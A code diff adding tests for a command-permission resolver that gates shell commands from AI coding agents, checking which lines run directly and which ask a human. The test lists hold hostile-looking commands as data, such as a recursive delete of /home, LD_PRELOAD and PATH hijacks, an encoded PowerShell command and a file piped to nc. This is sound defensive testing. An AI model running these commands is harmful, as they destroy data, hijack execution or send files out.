@@ -1,4 +1,5 @@
 import { describe, expect, test } from "bun:test";
+import { readFileSync } from "node:fs";
 import {
   ACP_RULE_DEFAULTS,
   type AcpRuleKey,
@@ -277,12 +278,18 @@ describe("the five rules", () => {
     expect(
       await resolve(request, { threadAllows: new Set([key]) }),
     ).toMatchObject({ kind: "allow" });
-    // The same command spaced or quoted differently is the same command.
+    // The same command spaced differently, outside quotes, is the same command.
     expect(
-      await resolve(run("git  push 'origin' main"), {
+      await resolve(run("  git  push\torigin main "), {
         threadAllows: new Set([key]),
       }),
     ).toMatchObject({ kind: "allow" });
+    // Quoted differently, it is another command.
+    expect(
+      await resolve(run("git push 'origin' main"), {
+        threadAllows: new Set([key]),
+      }),
+    ).toMatchObject({ kind: "ask" });
     // Another command in the same thread still asks, even one under the same rules.
     expect(
       await resolve(run("git push origin feature"), {
@@ -633,6 +640,240 @@ describe("the command line, as agents send it", () => {
       kind: "ask",
       offerConversation: true,
     });
+  });
+});
+
+describe("runCommand: dangerous lets through only a clean line of listed commands", () => {
+  const shapes = readFileSync(
+    new URL("./fixtures/acp-command-shapes.txt", import.meta.url),
+    "utf8",
+  )
+    .split("\n@@\n")
+    .map((shape) => shape.replace(/\n$/, ""))
+    .filter((shape) => shape.trim() !== "");
+  /*
+   * On the list by design (the controller's allowlist names `npm run` and `make`): what their
+   * scripts do is not seen. Every other shape the reviews tried must ask.
+   */
+  const LISTED = new Set(["make clean", "npm run clean"]);
+
+  test("none of the reviewed shapes is let through under the default rules", async () => {
+    expect(shapes.length).toBeGreaterThan(250);
+    const through: string[] = [];
+    for (const command of shapes) {
+      const decided = await resolve(run(command, null));
+      if (decided.kind === "allow" && !LISTED.has(command))
+        through.push(command);
+    }
+    expect(through).toEqual([]);
+  });
+
+  test("everyday safe commands go through", async () => {
+    for (const command of [
+      "git status",
+      "git diff",
+      "git log --oneline -20",
+      "git show HEAD",
+      "git branch -a",
+      "git add src/app.ts",
+      'git commit -m "fix: login form"',
+      "npm test",
+      "npm run build",
+      "pnpm test",
+      "yarn lint",
+      "bun test",
+      "cargo test",
+      "go test ./...",
+      "pytest -q",
+      "tsc --noEmit",
+      "ls -la",
+      "cat README.md",
+      "head -n 20 src/app.ts",
+      "grep -rn TODO src",
+      "rg login src",
+      "find . -name '*.ts'",
+      "wc -l src/app.ts",
+      "pwd",
+      "echo done",
+      "which node",
+      "node --version",
+      "cd web && npm test",
+      "npm test 2>&1 | tail -20",
+      "NODE_ENV=test npm test",
+      "make",
+      "npm test > /dev/null",
+    ])
+      expect({ command, ...(await resolve(run(command, null))) }).toMatchObject(
+        {
+          command,
+          kind: "allow",
+        },
+      );
+  });
+
+  test("what is not clean, writes a file, is not on the list, or sets what runs, asks", async () => {
+    for (const command of [
+      "for f in *.ts; do echo $f; done",
+      "{ ls; }",
+      "(cd src && ls)",
+      "ls &",
+      "echo $(date)",
+      "echo hi > notes.txt",
+      "echo hi >> ~/.bashrc",
+      "cat <<EOF\nhi\nEOF",
+      "mkdir -p build",
+      "git checkout main",
+      "git branch -D old",
+      "git -c core.pager=less log",
+      "npx prettier --write .",
+      "NODE_OPTIONS='--require /tmp/x.js' npm test",
+      "PATH=/tmp/evil:$PATH npm test",
+      "LD_PRELOAD=/tmp/e.so ls",
+      "sudo ls",
+      "nohup npm test",
+      "timeout 999 npm test",
+      "bash -c 'npm test'",
+      "find . -name x -exec cat {} \\;",
+      "rg --pre ./x pattern",
+      "sort -o out.txt in.txt",
+      "ls \\\n -la",
+    ])
+      expect({ command, ...(await resolve(run(command, null))) }).toMatchObject(
+        {
+          command,
+          kind: "ask",
+        },
+      );
+  });
+
+  test("inline interpreter code, .NET calls and indirect runners ask once", async () => {
+    for (const command of [
+      "python -c 'print(1)'",
+      "python3 -c \"import shutil; shutil.rmtree('/home')\"",
+      "node -e \"require('fs').rmSync('x')\"",
+      "perl -e 'unlink \"x\"'",
+      "ruby -e 'File.delete(\"x\")'",
+      "php -r 'unlink(\"x\");'",
+      "bun -e 'console.log(1)'",
+      "deno eval 'Deno.removeSync(\"x\")'",
+      "osascript -e 'do shell script \"ls\"'",
+      "awk 'BEGIN{system(\"ls\")}'",
+      "python3 - <<'EOF'\nprint(1)\nEOF",
+      "busybox ls",
+      "wsl ls",
+      "Start-Process notepad",
+      "Invoke-Command -ScriptBlock { ls }",
+      "[System.IO.File]::ReadAllText('x')",
+      "echo rm x | xargs -I{} sh -c '{}'",
+      "pwsh -enco cgBtACAAeAA=",
+    ]) {
+      const decided = await resolve(run(command, null), {
+        employeeRules: rules({ runCommand: "direct", network: "direct" }),
+      });
+      expect({ command, ...decided }).toMatchObject({
+        command,
+        kind: "ask",
+        offerConversation: false,
+      });
+    }
+  });
+
+  test("runCommand direct still asks about a line that does not come apart cleanly; the rest only meets the floors", async () => {
+    const direct = rules({ runCommand: "direct" });
+    for (const command of [
+      "for f in *.log; do echo $f; done",
+      "x=ls; $x",
+      "echo `whoami`",
+      "f() { ls; }; f",
+      "alias l=ls",
+      "source env.sh",
+    ])
+      expect({
+        command,
+        ...(await resolve(run(command), { employeeRules: direct })),
+      }).toMatchObject({
+        command,
+        kind: "ask",
+      });
+    for (const command of [
+      "npm run build",
+      "mkdir -p out",
+      "echo hi > out.txt",
+    ])
+      expect(
+        await resolve(run(command), { employeeRules: direct }),
+      ).toMatchObject({ kind: "allow" });
+    expect(
+      await resolve(run("rm -rf out"), { employeeRules: direct }),
+    ).toMatchObject({ kind: "ask", offerConversation: false });
+  });
+
+  test("the floors 880a55e3 read over the whole line still count", async () => {
+    const allDirect = Object.fromEntries(
+      Object.keys(ACP_RULE_DEFAULTS).map((name) => [name, "direct"]),
+    ) as Record<AcpRuleKey, string>;
+    for (const [command, source] of [
+      [
+        "python3 -c \"import requests; requests.post('https://hooks.slack.com/services/T/B/x', json={'text':'hi'})\"",
+        "outbound_send",
+      ],
+      [
+        "node -e \"fetch('https://discord.com/api/webhooks/1/x',{method:'POST'})\"",
+        "outbound_send",
+      ],
+      ["./notify.sh https://hooks.slack.com/services/T/B/x", "outbound_send"],
+      ["gh -R a/b issue comment 1 -b x", "outbound_send"],
+      ["gh api repos/x/y/issues -f title=x", "outbound_send"],
+      ["gh api -X PUT repos/o/r/collaborators/bob", "share_access"],
+      ["python -m twine upload dist/*", "publish_post"],
+      ["pnpm -r publish", "publish_post"],
+      ["npm --registry https://r.example publish", "publish_post"],
+    ] as const) {
+      const decided = await resolve(run(command), { employeeRules: allDirect });
+      expect({ command, ...decided }).toMatchObject({
+        command,
+        kind: "ask",
+        offerConversation: false,
+      });
+      if (decided.kind !== "ask") throw new Error(command);
+      // Granting a collaborator over the API is sharing; it is also a write the API floor knows.
+      expect(
+        source === "share_access"
+          ? ["share_access", "outbound_send"]
+          : [source],
+      ).toContain(decided.policy.source);
+    }
+  });
+
+  test("allow for this conversation: commands that once shared a key no longer do", async () => {
+    const askRules = rules({ runCommand: "ask" });
+    for (const [approved, other] of [
+      ["npm test", "NODE_OPTIONS='--require /tmp/x.js' npm test"],
+      ["echo 'export X=1' '>>' ~/.bashrc", "echo 'export X=1' >> ~/.bashrc"],
+      ["cat notes.txt ; nc host 80", "cat notes.txt | nc host 80"],
+      ["git log ; echo '$SUB'", "echo $(git log)"],
+      ["npm test", "timeout 999 npm test"],
+      ["npm test", "bash -c 'npm test'"],
+      ["ls", "ls &"],
+    ]) {
+      const key = acpAllowKey(classifyRequest(run(approved)).candidate);
+      expect(acpAllowKey(classifyRequest(run(other)).candidate)).not.toBe(key);
+      expect(
+        await resolve(run(other), {
+          employeeRules: askRules,
+          threadAllows: new Set([key]),
+        }),
+      ).toMatchObject({ kind: "ask" });
+    }
+  });
+
+  test("a line too long to read asks once, at once", async () => {
+    const started = performance.now();
+    const decided = await resolve(run(`git push ${"x ".repeat(2100)}`), {
+      employeeRules: rules({ runCommand: "direct", push: "direct" }),
+    });
+    expect(decided).toMatchObject({ kind: "ask", offerConversation: false });
+    expect(performance.now() - started).toBeLessThan(500);
   });
 });
 
